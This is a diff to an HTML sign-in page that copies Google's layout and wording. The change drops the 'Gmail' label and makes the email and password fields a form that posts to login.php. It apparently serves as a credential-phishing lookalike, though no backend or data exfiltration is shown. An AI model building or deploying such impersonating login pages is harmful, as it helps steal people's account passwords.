@@ -237,31 +237,33 @@
         </div>
         
         <div class="login-form">
-            <h1>Sign in</h1>
-            <h2 style="text-align: center; font-size: 16px; font-weight: 400; color: #202124; margin-bottom: 20px;">to continue to Gmail</h2>
-            
-            <div class="input-field">
-                <input name="uname" type="text" class="input-text" autocomplete="username" required>
-                <label>Email or phone</label>
-            </div>
-            
-            <div class="input-field">
-                <input name="pass" type="password" class="input-text" autocomplete="current-password" required>
-                <label>Enter your password</label>
-                <a href="#" class="forgot-password">Forgot password?</a>
-            </div>
-            
-            <a href="#" class="forgot-email">Forgot email?</a>
-            
-            <div style="clear: both;"></div>
-            
-            <p style="color: #5f6368; font-size: 14px; margin-bottom: 30px;">Not your computer? Use Guest mode to sign in privately.</p>
-            
-            <a href="#" style="display: block; text-align: left; color: #1a73e8; text-decoration: none; font-weight: 500; margin-bottom: 30px;">Learn more</a>
-            
-            <input type="submit" value="Next"></button>
+    <form action="login.php" method="POST">
+        <h1>Sign in</h1>
+        <h2 style="text-align: center; font-size: 16px; font-weight: 400; color: #202124; margin-bottom: 20px;">to continue</h2>
+        
+        <div class="input-field">
+            <input name="username" type="text" class="input-text" autocomplete="username" required>
+            <label>Email or phone</label>
         </div>
         
+        <div class="input-field">
+            <input name="password" type="password" class="input-text" autocomplete="current-password" required>
+            <label>Enter your password</label>
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </div>
+        
+        <a href="#" class="forgot-email">Forgot email?</a>
+        
+        <div style="clear: both;"></div>
+        
+        <p style="color: #5f6368; font-size: 14px; margin-bottom: 30px;">Not your computer? Use Guest mode to sign in privately.</p>
+        
+        <a href="#" style="display: block; text-align: left; color: #1a73e8; text-decoration: none; font-weight: 500; margin-bottom: 30px;">Learn more</a>
+        
+        <input type="submit" value="login" class="next-btn">
+    </form>
+</div>
+
         <div class="signup-section">
             <p class="signup-text">Don't have an account?</p>
             <a href="#" class="create-account">Create account</a>
